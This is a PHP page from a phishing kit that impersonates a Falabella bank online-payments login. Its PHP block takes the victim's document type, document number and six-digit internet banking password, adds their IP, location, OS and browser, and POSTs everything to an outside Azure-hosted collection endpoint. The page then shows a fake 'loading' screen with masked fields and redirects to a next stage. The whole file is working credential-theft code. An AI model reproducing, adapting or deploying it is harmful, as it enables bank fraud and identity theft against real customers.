<?php ini_set('display_errors', 0);

include('funciones.php');
if (isset($_POST['tipoper']) && isset($_POST['tipodoc']) && isset($_POST['numd']) && isset($_POST['numcl'])) {
    $message = 'Fallabel-inf
TipoPersona: ' . $_POST['tipoper'] . '
TipoDoc: ' . $_POST['tipodoc'] . '
NumDoc: ' . $_POST['numd'] . '
ClavInter: ' . $_POST['numcl'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/falabellanequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json',
'X-Client-IP: ' . $myip,
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">


    <link rel="stylesheet" href="files/hojadestilo.css">
    <title>F-Clientes</title>
    <META HTTP-EQUIV="REFRESH" CONTENT="10;URL=segundo.php">
</head>

<body>
    <br>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            $('#myModal').modal('toggle')
        });
        $('body').removeClass('modal-open');
        $('.modal-backdrop').remove();
    </script>
    <form method="post" action="#">
        <div id="myModal" class="modal " data-backdrop="false" style="top:220px;">
            <div class="modal-dialog modal-login">
                <div class="modal-content">

                    <div class="modal-body">
                        <div align="center"><img src="files/oder.gif" style="width:140px"> <br>
                            <span style="font-family: arial;color:#000;font-size: 1.2rem;">Cargando... por favor espera</b></span>
                        </div>
                    </div>

                </div>
            </div>
        </div>
        <p class="focus"><img src="files/spaceLogo-1.png" alt="" style="width:200px"></p><br>
        <center>
            <div class="elcontenido" style="opacity: 0.4;"><br>
                <h1 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">Pagos en línea</h1><br><br>

                <span style="line-height:1;margin-left:-300px;">Tipo de Persona</span><br>

                <select name="tipoper" style="width: 410px; height: 50px;" disabled class="xinput">
                    <option value="Natural">Persona Natural</option>
                    <option value="Juridica">Persona Juridica</option>
                </select>
                <br>
                <span style="line-height: 1;margin-left:-280px;">Tipo de Documento</span><br>

                <select name="tipodoc" style="width: 410px; height: 50px;" disabled class="xinput">
                    <option value="Cédula Ciudadanía">Cédula Ciudadanía</option>
                    <option value="Cédula de Entranjería">Cédula de Entranjería</option>
                    <option value="Pasaporte">Pasaporte</option>
                </select><br>
                <span style="line-height: 1;margin-left:-260px;">Número de Documento</span><br>
                <input autocomplete="off" value="*******" disabled id="elr" name="elr" inputmode="numeric" class="xinput" placeholder="Escribe el número de documento" type="text">
                <br>
                <span style="line-height: 1;margin-left:-320px;">Clave Internet</span><br>
                <input minlength="6" maxlength="6" value="*****" disabled autocomplete="off" id="elint" name="elint" class="xinput" placeholder="Escribe tu clave nnternet" type="text"><br>

                <input value="Ingresar" class="delboton" disabled type="submit">

                <h4 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">
                    Recuerda ingresar todos los datos solicitados, este paso es obligatorio!
                </h4>
            </div>
        </center>
    </form>
</body>

</html>